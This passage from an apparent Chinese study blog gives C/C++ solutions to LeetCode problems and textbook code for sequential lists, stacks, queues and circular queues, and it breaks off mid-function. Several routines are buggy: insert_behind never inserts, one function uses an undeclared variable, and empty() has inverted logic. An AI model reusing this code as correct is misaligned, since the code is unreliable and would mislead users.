<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//双指针</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">findLongestWord</span><span class="params">(string s, vector&lt;string&gt;&amp; dictionary)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">sort</span>(dictionary.<span class="built_in">begin</span>(), dictionary.<span class="built_in">end</span>(), [](string&amp; a, string&amp; b)&#123;<span class="comment">//按照 长度排序，长度一致则按照 下标排序</span></span><br><span class="line">            <span class="keyword">if</span>(a.<span class="built_in">length</span>() == b.<span class="built_in">length</span>()) <span class="keyword">return</span> a &lt; b;</span><br><span class="line">            <span class="keyword">return</span> a.<span class="built_in">length</span>() &gt; b.<span class="built_in">length</span>();</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> ss:dictionary)&#123;</span><br><span class="line">            <span class="keyword">int</span> m = ss.<span class="built_in">size</span>();<span class="comment">//字典中 某字符串</span></span><br><span class="line">            <span class="keyword">if</span>(m&gt;n) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;<span class="comment">//双指针</span></span><br><span class="line">            <span class="keyword">while</span>(i&lt;n &amp;&amp; j&lt;m)&#123;</span><br><span class="line">                <span class="keyword">if</span>(s[i]==ss[j])</span><br><span class="line">                    j++;</span><br><span class="line">                i++;</span><br><span class="line">                <span class="keyword">if</span>(j==m)</span><br><span class="line">                    <span class="keyword">return</span> ss;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="409-最长回文串——不连续-构造"><a href="#409-最长回文串——不连续-构造" class="headerlink" title="409 最长回文串——不连续-构造"></a>409 最长回文串——不连续-构造</h2><p>给定一个包含大写字母和小写字母的字符串 s ，返回 通过这些字母【构造成的 最长的回文串】 。<br>在构造过程中，请注意 区分大小写 。比如 “Aa” 不能当做一个回文字符串。</p>
<pre><code>示例 1:
输入:s = &quot;abccccdd&quot;
输出:7
解释:
我们可以构造的最长的回文串是&quot;dccaccd&quot;, 它的长度是 7。
</code></pre>
<p><strong>回文串中【个数是奇数个的字符】【最多只能有一个】</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">longestPalindrome</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        unordered_map&lt;<span class="keyword">char</span>,<span class="keyword">int</span>&gt; maap;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>, flag = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> c:s)&#123;</span><br><span class="line">            maap[c]++;<span class="comment">//记录每个字符个数</span></span><br><span class="line">            <span class="keyword">if</span>(maap[c]==<span class="number">2</span>)&#123;</span><br><span class="line">                res += <span class="number">2</span>;<span class="comment">//遇2，长度+2</span></span><br><span class="line">                maap[c] = <span class="number">0</span>;<span class="comment">//恢复为0</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(res &lt; n)</span><br><span class="line">            res++;<span class="comment">//若最终长度小于字符串本身长度，证明该字符串中包含个数是奇数个的字符，再+1就好</span></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>力扣刷题</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>力扣</tag>
      </tags>
  </entry>
  <entry>
    <title>顺序表、栈、队列</title>
    <url>/2021/10/05/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E3%80%81%E6%A0%88%E3%80%81%E9%98%9F%E5%88%97/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p>
<h3 id="顺序表"><a href="#顺序表" class="headerlink" title="顺序表"></a>顺序表</h3><p>插入 删除 任意位置，特点：顺序存储</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    datatype a[MAXSIZE];</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">&#125;sequence_list;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(sequence_list *slt)</span></span>&#123;</span><br><span class="line">    slt-&gt;size = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//在顺序表后部进行插入操作</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert_behind</span><span class="params">(sequence_list *slt,datatype x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(slt-&gt;size == MAXSIZE)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;顺序表是满的！&quot;</span>);<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        slt-&gt;a[slt-&gt;size]=x;</span><br><span class="line">        slt-&gt;size = slt-&gt;size+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//打印</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(sequence_list slt)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">if</span>(!slt.size) <span class="built_in">printf</span>(<span class="string">&quot;顺序表是空的！&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;slt.size;i++)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,slt.a[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断空 </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">empty</span><span class="params">(sequence_list slt)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span>(slt.size==<span class="number">0</span>?<span class="number">0</span>:<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查找 值为 x 的 结点位置</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_x</span><span class="params">(sequence_list slt,datatype x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(slt.a[i]!=x &amp;&amp; i&lt;slt.size) i++;    </span><br><span class="line">    <span class="keyword">return</span>(i&lt;slt.size?i:<span class="number">-1</span>);   </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//取得 第 i 位置的 值</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_i</span><span class="params">(sequence_list slt,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;<span class="number">0</span> || i&gt;slt.size)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;指定位置不存在！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span>(slt.a[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//任意位置插入</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert_medium</span><span class="params">(sequence_list *slt,<span class="keyword">int</span> position,datatype x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">if</span>(slt-&gt;size == MAXSIZE) </span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;顺序表是满的！&quot;</span>);<span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line">    <span class="keyword">if</span>(position &lt; <span class="number">0</span> || position &gt; slt-&gt;size)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;指定插入位置不存在！&quot;</span>);<span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(i=slt-&gt;size;i&gt;position;i--)</span><br><span class="line">        slt-&gt;a[i] = slt-&gt;a[i<span class="number">-1</span>];</span><br><span class="line">        </span><br><span class="line">    slt-&gt;a[position] = x;</span><br><span class="line">    slt-&gt;size++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//删除 某位置 结点值</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(sequence_list *slt,<span class="keyword">int</span> position)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">if</span>(slt-&gt;size == <span class="number">0</span>)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;顺序表是空的！&quot;</span>);<span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line">    <span class="keyword">if</span>(position&lt;<span class="number">0</span> || position &gt; slt.size)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;指定删除位置不存在！&quot;</span>);<span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(i=position;i&lt;slt-&gt;size;i++)</span><br><span class="line">        slt-&gt;a[i] = slt-&gt;a[i+<span class="number">1</span>];</span><br><span class="line">    slt-&gt;size--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><p>先进后出</p>
<p>插入 删除 同一端进行，为 栈顶，另一端封住，为栈底</p>
<p>插入 删除 操作 称为 进栈 出栈</p>
<p>栈实现：顺序存储、链式存储</p>
<p>以顺序存储为例：栈底：a[0]    栈顶  top</p>
<p>设定 top 所指的位置 是 下一个将要插入结点的位置</p>
<p>栈为空 ：top=0    </p>
<p><img src="https://i.loli.net/2021/09/24/Gc5HIKai7MNz8lu.png" alt="image-20210924104929877"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    datatype a[MAXSIZE];</span><br><span class="line">    <span class="keyword">int</span> top;</span><br><span class="line">&#125;sequence_stack;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(sequence_stack *st)</span></span>&#123;</span><br><span class="line">    st-&gt;top = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断 是否 空</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">empty</span><span class="params">(sequence_stack st)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span>(st.top==<span class="number">0</span>?<span class="number">0</span>:<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//取得 栈顶结点值</span></span><br><span class="line"><span class="function">datatype <span class="title">get_top</span><span class="params">(sequence_stack st)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(empty(st))</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;栈是空的！&quot;</span>);<span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> st.a[st.top<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//插入 </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(sequence_stack *st,datatype x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(st-&gt;top == MAXSIZE)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;栈是满的！&quot;</span>);<span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line">    st-&gt;a[top] = x;</span><br><span class="line">    st-&gt;top++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//删除</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(sequence_stack *st)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(st-&gt;top == <span class="number">0</span>)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;栈是空的！&quot;</span>);<span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line">    st-&gt;top--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/09/24/mPSWeVpM6cAxBv1.png" alt="image-20210924110444661"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//括号匹配</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h3><p>先进先出</p>
<p>特点：插入 删除 操作  分别在表的两端进行，</p>
<p>插入 即 队尾  ，  删除即 队首</p>
<p>front  队首结点在数组元素中的下标，  rear  队尾结点在数组中元素下标的 下一个位置，即 即将插入的结点 在数组中的下标</p>
<p>称之为  进队 和  出队</p>
<p><img src="https://i.loli.net/2021/09/24/26pOHtGlRmsoZFx.png" alt="image-20210924110810951"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    datatype a[MAXSIZE];</span><br><span class="line">    <span class="keyword">int</span> front;</span><br><span class="line">    <span class="keyword">int</span> rear;</span><br><span class="line">&#125;sequence_queue;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(sequence_queue *sq)</span></span>&#123;</span><br><span class="line">    sq-&gt;front = sq-&gt;rear = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断是否是 空</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">empty</span><span class="params">(sequence_queue sq)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span>(sq.front==sq.rear?<span class="number">0</span>:<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//打印</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(sequence_queue sq)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">if</span>(empty(sq))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;顺序队列是空的！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">for</span>(i=sq.front;i&lt;sq.rear;i++)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,sq.a[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//插入</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(sequence_queue *sq,datatype x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">if</span>(sq-&gt;rear == MAXSIZE)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;顺序队列是满的！&quot;</span>);<span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line">    sq-&gt;a[sq-&gt;rear] = x;</span><br><span class="line">    sq-&gt;rear = sq-&gt;rear+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//删除</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(sequence_queue *sq)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(sq-&gt;front == sq-&gt;rear)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;顺序队列是空的！&quot;</span>);<span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line">    sq-&gt;front++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/09/24/iwbsYCzS2U6nmaH.png" alt="image-20210924111918226"></p>
<p><img src="https://i.loli.net/2021/09/24/sLF8rGWwAIhxQpH.png" alt="image-20210924112001725"></p>
<p>循环队列中  满与空  的条件均是  front==rear   出现问题</p>
<p>问题解决：满 的条件 (rear+1)%MAXSIZE=front</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//循环队列 插入 操作</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert_c</span><span class="params">(sequence_queue *sq,datatype x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">if</span>((sq-&gt;rear+<span class="number">1</span>)%MAXSIZE == sq-&gt;front)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;循环队列是满的！&quot;</span>);<span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line">    sq-&gt;a[sq-&gt;rear] = x;</span><br><span class="line">    sq-&gt;rear = (sq-&gt;rear+<span class="number">1</span>)%MAXSIZE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//循环队列 删除 操作</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_c</span><span class="params">(sequence_queue *sq)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(sq-&gt;front == sq-&gt;rear)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;循环队列是空的！&quot;</span>);<span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line">    sq-&gt;front = (sq-&gt;front+<span class="number">1</span>)%MAXSIZE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="第二章-—-题目"><a href="#第二章-—-题目" class="headerlink" title="第二章 — 题目"></a>第二章 — 题目</h2><h4 id="1-设计一个算法，求顺序表中值为x的结点的个数。"><a href="#1-设计一个算法，求顺序表中值为x的结点的个数。" class="headerlink" title="1.设计一个算法，求顺序表中值为x的结点的个数。"></a>1.设计一个算法，求顺序表中值为x的结点的个数。</h4><p><strong>算法：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> data[N];</span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">&#125;sqlist;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">count</span><span class="params">(sqlist L,<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,sum =  <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;L.length;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(L.data[i] == x)&#123;</span><br><span class="line">            sum++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>(sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>测试：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> data[N];</span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">&#125;sqlist;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">count</span><span class="params">(sqlist L,<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,sum =  <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;L.length;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(L.data[i] == x)&#123;</span><br><span class="line">            sum++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>(sum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    sqlist <span class="built_in">list</span> = &#123;&#123;<span class="number">1</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">0</span>&#125;,<span class="number">10</span>&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;count = %d\n&quot;</span>,count(<span class="built_in">list</span>,<span class="number">5</span>)); <span class="comment">//查找值为5的元素个数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/09/15/ltsbQV9L75CmhO6.png" alt="image-20210915203225682"></p>
<h4 id="2-设计一个算法，将一个顺序表倒置。即，如果顺序表各个结点值存储在一维数组a中，倒置的结果是使得数组a中的a-0-等于原来的最后一个元素，a-1-等于原来的倒数第2个元素，…，a的最后一个元素等于原来的第一个元素。"><a href="#2-设计一个算法，将一个顺序表倒置。即，如果顺序表各个结点值存储在一维数组a中，倒置的结果是使得数组a中的a-0-等于原来的最后一个元素，a-1-等于原来的倒数第2个元素，…，a的最后一个元素等于原来的第一个元素。" class="headerlink" title="2.设计一个算法，将一个顺序表倒置。即，如果顺序表各个结点值存储在一维数组a中，倒置的结果是使得数组a中的a[0]等于原来的最后一个元素，a[1] 等于原来的倒数第2个元素，…，a的最后一个元素等于原来的第一个元素。"></a>2.设计一个算法，将一个顺序表倒置。即，如果顺序表各个结点值存储在一维数组a中，倒置的结果是使得数组a中的a[0]等于原来的最后一个元素，a[1] 等于原来的倒数第2个元素，…，a的最后一个元素等于原来的第一个元素。</h4><p><strong>算法：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> data[N];</span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">&#125;sqlist;</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse</span><span class="params">(sqlist *L)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,t;</span><br><span class="line">    i = <span class="number">0</span>;			<span class="comment">// 第一个元素位置</span></span><br><span class="line">    j = L-&gt;length - <span class="number">1</span>; <span class="comment">// 最后一个元素位置</span></span><br><span class="line">    <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">        t = L-&gt;data[i]; <span class="comment">// 将第一个元素存入 临时的 t 中 </span></span><br><span class="line">        L-&gt;data[i++] = L-&gt;data[j]; <span class="comment">// 把最后一个元素值赋给第一个元素的位置</span></span><br><span class="line">        L-&gt;data[j--] = t; <span class="comment">// 再把 存入 t 的第一个元素的值赋给</span></span><br><span class="line">        				<span class="comment">// 注意：j-- 的意思：首先进行赋值然后再进行自减</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>测试：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> data[N];</span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">&#125;sqlist;</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse</span><span class="params">(sqlist *L)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,t;</span><br><span class="line">    i = <span class="number">0</span>;			<span class="comment">// 第一个元素位置</span></span><br><span class="line">    j = L-&gt;length - <span class="number">1</span>; <span class="comment">// 最后一个元素位置</span></span><br><span class="line">    <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">        t = L-&gt;data[i]; <span class="comment">// 将第一个元素存入 临时的 t 中 </span></span><br><span class="line">        L-&gt;data[i++] = L-&gt;data[j]; <span class="comment">// 把最后一个元素值赋给第一个元素的位置</span></span><br><span class="line">        L-&gt;data[j--] = t; <span class="comment">// 再把 存入 t 的第一个元素的值赋给</span></span><br><span class="line">						<span class="comment">// 注意：j-- 的意思：首先进行赋值然后再进行自减</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    sqlist <span class="built_in">list</span> = &#123;&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">0</span>&#125;,<span class="number">10</span>&#125;;</span><br><span class="line">    reverse(&amp;<span class="built_in">list</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="built_in">list</span>.length;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">list</span>.data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/09/15/nMp3fvKexAsPEZS.png" alt="image-20210915205210790"></p>
<h4 id="3-已知一个顺序表中的各结点值是从小到大有序的，设计一个算法，插入一个值为x的结点，使顺序表中的结点仍然是从小到大有序。"><a href="#3-已知一个顺序表中的各结点值是从小到大有序的，设计一个算法，插入一个值为x的结点，使顺序表中的结点仍然是从小到大有序。" class="headerlink" title="3.已知一个顺序表中的各结点值是从小到大有序的，设计一个算法，插入一个值为x的结点，使顺序表中的结点仍然是从小到大有序。"></a>3.已知一个顺序表中的各结点值是从小到大有序的，设计一个算法，插入一个值为x的结点，使顺序表中的结点仍然是从小到大有序。</h4><p><strong>算法：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> data[N];</span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">&#125;sqlist;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(sqlist *L,datatype x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">if</span>(L-&gt;length &lt; N)&#123;   <span class="comment">//确保顺序表不满，能够进行插入数据</span></span><br><span class="line">        i = L-&gt;length - <span class="number">1</span>; <span class="comment">// i 是最后一个元素位置</span></span><br><span class="line">		<span class="keyword">while</span>(i &gt;= <span class="number">0</span> 